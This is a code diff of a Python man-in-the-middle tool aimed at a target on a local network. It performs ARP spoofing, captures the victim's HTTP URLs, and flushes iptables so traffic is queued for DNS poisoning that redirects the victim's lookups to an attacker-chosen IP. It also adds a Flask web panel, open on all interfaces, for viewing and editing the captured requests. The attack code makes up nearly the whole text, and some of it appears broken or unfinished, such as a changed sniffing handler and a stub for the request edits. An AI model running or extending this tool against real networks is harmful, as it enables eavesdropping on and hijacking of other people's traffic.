@@ -10,8 +10,9 @@ import os
 import platform
 import ctypes
 import subprocess
-from flask import Flask, request, render_template_string
+from flask import Flask, render_template_string, request, redirect, url_for
 import threading
+import time
 
 # Check platform and privileges
 if platform.system() == "Windows":
@@ -31,6 +32,46 @@ parser.add_argument('--network', help='Network to scan (e.g., "192.168.0.0/24")'
 parser.add_argument('--iface', help='Network interface to use', required=True)
 parser.add_argument('--routerip', help='IP of your home router', required=True)
 opts = parser.parse_args()
+
+# Flask app for HTTP modification
+app = Flask(__name__)
+http_urls = []
+
+@app.route('/')
+def home():
+    return render_template_string("""
+    <html>
+    <body>
+        <h1>Captured HTTP Requests</h1>
+        <ul>
+        {% for url in urls %}
+            <li><a href="{{ url_for('modify', url=url) }}">{{ url }}</a></li>
+        {% endfor %}
+        </ul>
+    </body>
+    </html>
+    """, urls=http_urls)
+
+@app.route('/modify', methods=["GET", "POST"])
+def modify():
+    url = request.args.get('url')
+    if request.method == 'POST':
+        new_content = request.form['new_content']
+        print(f"Modifying URL {url} with new content: {new_content}")
+        # Logic to modify the content will go here
+        return redirect(url_for('home'))
+    
+    return render_template_string("""
+    <html>
+    <body>
+        <h1>Modify Request for {{ url }}</h1>
+        <form method="post">
+            <textarea name="new_content" rows="10" cols="50"></textarea><br>
+            <button type="submit">Submit</button>
+        </form>
+    </body>
+    </html>
+    """, url=url)
 
 def arp_scan(network, iface):
     ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network),
@@ -52,7 +93,6 @@ class Device:
         self.routerip = routerip
         self.targetip = targetip
         self.iface = iface
-        self.http_urls = []  # Stores the HTTP URLs
 
     def mitm(self):
         while True:
@@ -71,7 +111,14 @@ class Device:
         time = strftime("%m/%d/%Y %H:%M:%S", localtime())
         print(f'[{Fore.GREEN}{time} | {Fore.BLUE}{self.targetip} -> {Fore.RED}{record}{Style.RESET_ALL}]')
 
-    def http_sniff(self):
+    def arp_sniff(self):
+        def arp_pkt_callback(pkt):
+            if pkt.haslayer(ARP) and pkt[ARP].op == 1:
+                print(f'{Fore.YELLOW}ARP Sniff: {pkt[ARP].psrc} -> {pkt[ARP].pdst}{Style.RESET_ALL}')
+        sniff(iface=self.iface, prn=arp_pkt_callback,
+              filter=f'arp and host {self.targetip}', store=0)
+
+    def http_sniff(self, pkt):
         def http_pkt_callback(pkt):
             if pkt.haslayer('Raw'):
                 raw_data = pkt['Raw'].load.decode(errors='ignore')
@@ -82,7 +129,7 @@ class Device:
                             path = raw_data.split("GET ")[1].split(" HTTP")[0]
                             url = f"http://{host}{path}"
                             print(f"{Fore.CYAN}Captured URL: {url}{Style.RESET_ALL}")
-                            self.http_urls.append(url)  # Add captured URL to the list
+                            http_urls.append(url)  # Add captured URL to the list
                         except Exception:
                             pass
 
@@ -98,22 +145,17 @@ class Device:
               filter=f'tcp port 80 and host {self.targetip}', store=0)
 
     def enable_ip_forwarding(self):
+        # Enable IP forwarding using subprocess
         subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
         print(f'{Fore.GREEN}IP forwarding enabled!{Style.RESET_ALL}')
 
     def set_iptables(self):
+        # Use iptables to forward packets to NFQUEUE
         subprocess.call(f"iptables --flush", shell=True)
         subprocess.call(f"iptables -A FORWARD -j NFQUEUE --queue-num 0", shell=True)
         print(f'{Fore.GREEN}Iptables rules set to forward packets to NFQUEUE 0.{Style.RESET_ALL}')
 
     def dns_poison(self, spoof_ip):
-        if platform.system() == "Windows":
-            print(f"{Fore.RED}DNS Spoofing is not supported on Windows.{Style.RESET_ALL}")
-            return
-
-        # Import NetfilterQueue only if DNS Spoofing is selected
-        from netfilterqueue import NetfilterQueue
-        
         def dns_pkt_callback(pkt):
             if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
                 spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
@@ -123,60 +165,12 @@ class Device:
                 send(spoofed_pkt, iface=self.iface, verbose=False)
                 print(f'{Fore.RED}DNS Poison: Redirected {pkt[DNS].qd.qname.decode()} to {spoof_ip}{Style.RESET_ALL}')
         
+        # Set up NFQUEUE for DNS packets
+        from netfilterqueue import NetfilterQueue
         nfqueue = NetfilterQueue()
         nfqueue.bind(0, dns_pkt_callback)
         print(f'{Fore.GREEN}Listening for DNS packets in NFQUEUE...{Style.RESET_ALL}')
         nfqueue.run()
-
-    def http_request_modification(self):
-        app = Flask(__name__)
-
-        @app.route('/')
-        def index():
-            # Display the captured HTTP URLs
-            if not self.http_urls:
-                return render_template_string("""
-                    <h1>HTTP Request Modification</h1>
-                    <p>No HTTP requests captured yet.</p>
-                """)
-            
-            url_list = "".join([f"<li><a href='/modify/{i}'>Modify {url}</a></li>" for i, url in enumerate(self.http_urls)])
-            return render_template_string("""
-                <h1>HTTP Request Modification</h1>
-                <ul>
-                    {{ url_list | safe }}
-                </ul>
-            """, url_list=url_list)
-
-        @app.route('/modify/<int:url_id>', methods=['GET', 'POST'])
-        def modify_request(url_id):
-            if url_id >= len(self.http_urls):
-                return f"{Fore.RED}Invalid URL ID.{Style.RESET_ALL}"
-
-            url = self.http_urls[url_id]
-            if request.method == 'POST':
-                content = request.form['content']
-                # Here you can apply the modification logic
-                print(f'{Fore.GREEN}Modified Content for {url}:{Style.RESET_ALL}\n{content}')
-                return f'Content modified for {url}: {content}'
-
-            return render_template_string("""
-                <h1>Modify HTTP Request for URL: {{ url }}</h1>
-                <form method="POST">
-                    <textarea name="content" rows="10" cols="50" placeholder="Modify HTTP Content Here...">{{ content }}</textarea><br>
-                    <input type="submit" value="Modify and Forward">
-                </form>
-            """, url=url)
-
-        def run_flask():
-            app.run(host='0.0.0.0', port=5000, threaded=True)
-
-        thread = threading.Thread(target=run_flask)
-        thread.daemon = True
-        thread.start()
-        print(f'{Fore.GREEN}Flask server started at http://0.0.0.0:5000{Style.RESET_ALL}')
-        
-        sniff(iface=self.iface, prn=self.http_sniff, filter=f'tcp port 80', store=0)
 
     def sniff(self):
         while True:
@@ -195,7 +189,10 @@ class Device:
                 spoof_ip = input(f'{Fore.RED}Enter spoofed IP: {Style.RESET_ALL}')
                 self.dns_poison(spoof_ip)
             elif choice == 4:
-                self.http_request_modification()
+                print(f'{Fore.CYAN}Opening HTTP Request Modification Web Control...{Style.RESET_ALL}')
+                threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000)).start()
+                time.sleep(2)  # Give Flask time to start
+                print(f"{Fore.CYAN}You can now view the captured URLs and modify them at http://localhost:5000{Style.RESET_ALL}")
             elif choice == 5:
                 print(f'{Fore.YELLOW}Exiting...{Style.RESET_ALL}')
                 break
